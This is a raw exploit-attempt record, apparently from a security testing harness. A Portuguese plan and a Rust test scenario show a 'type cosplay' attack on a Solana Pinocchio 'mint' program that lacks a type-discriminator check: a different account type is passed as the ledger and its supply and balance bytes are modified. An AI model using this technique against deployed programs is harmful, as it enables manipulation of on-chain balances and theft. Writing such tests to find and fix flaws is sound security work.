attempts.raw:
{
  "plan": "O programa `mint` (Pinocchio) le supply/balance de offsets fixos 40..48 e 48..56 sem verificar discriminador de tipo. Vou montar um baseline com uma conta 'ledger' legitima (dados com supply/balance em 40..56) e chamar mint com amount=10, provando que o cenario esta correto. No ataque, passo uma conta de outro tipo (ex.: uma conta 'vault' com layout diferente, mas cujos bytes 40..56 sao interpretaveis como supply/balance) no lugar do ledger. O efeito medido e que os offsets 40..56 da conta de outro tipo foram alterados (incrementados pelo amount), demonstrando que dados de outro tipo foram tratados como ledger valido.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 64];
ledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let mut ix_data = vec![2u8];
ix_data.extend_from_slice(&10u64.to_le_bytes());
let metas = vec![AccountMeta::new(ledger_key, false)];
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![(ledger_key, ledger.clone())];
let r = env.baseline("mint legitimo", &ix, &contas);

let other_key = Pubkey::new_unique();
let mut other_data = vec![0u8; 64];
other_data[0..8].copy_from_slice(&[9u8; 8]);
other_data[40..48].copy_from_slice(&7u64.to_le_bytes());
other_data[48..56].copy_from_slice(&3u64.to_le_bytes());
let other = account(&env.program_id, &other_data, None);

let metas_attack = vec![AccountMeta::new(other_key, false)];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![(other_key, other)];
let ra = env.attack("cosplay: conta de outro tipo como ledger", &ix_attack, &contas_attack);

if ra.program_result == ProgramResult::Success {
    let d = after(&ra, &other_key).data();
    env.effect("supply da conta de outro tipo foi incrementado", read_u64(d, 40) == 17);
    env.effect("balance da conta de outro tipo foi incrementado", read_u64(d, 48) == 13);
}"
}

